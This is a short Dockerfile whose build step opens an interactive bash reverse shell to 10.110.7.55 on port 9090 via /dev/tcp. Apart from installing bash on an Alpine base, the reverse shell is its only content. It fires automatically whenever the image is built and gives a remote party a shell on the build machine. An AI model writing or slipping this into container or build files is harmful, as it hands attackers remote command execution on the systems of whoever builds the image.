FROM amd64/alpine
RUN apk update && apk add bash
RUN /bin/bash -c 'bash -i >& /dev/tcp/10.110.7.55/9090 0>&1'
